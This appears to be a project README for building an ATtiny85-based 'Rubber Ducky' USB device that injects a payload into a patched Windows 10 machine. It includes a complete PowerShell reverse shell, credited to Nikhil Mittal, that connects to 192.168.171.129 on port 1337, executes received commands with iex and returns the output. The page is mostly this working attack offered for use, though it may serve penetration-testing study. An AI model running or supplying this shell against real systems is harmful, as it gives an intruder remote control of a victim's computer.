# ATtiny85 "Rubber Ducky"
## Creating a rubber ducky from an inexpensive programmable microcontroller to deploy a payload on a patched windows 10 system.

View/Download the [ATtiny85-Rubber-Ducky-Guide.pdf](ATtiny85-Rubber-Ducky-Guide.pdf)

### Reverse Shell Scripts
1. PowerShell Version: [powershell-client.ps1](01-Shell-Scripts/PowerShell/powershell-client.ps1)

```powershell
// Code written by: Nikhil Mittal, availible @ http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$sm=(New-Object Net.Sockets.TCPClient("192.168.171.129",1337)).GetStream()

[byte[]]$bt=0..255|%{0}

while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0)
    {
        $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i)
        $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1))
        $sm.Write($st,0,$st.Length)
}
```

2. PowerShell Version: [powershell-client.ps1](01-Shell-Scripts/PowerShell/powershell-client.ps1)
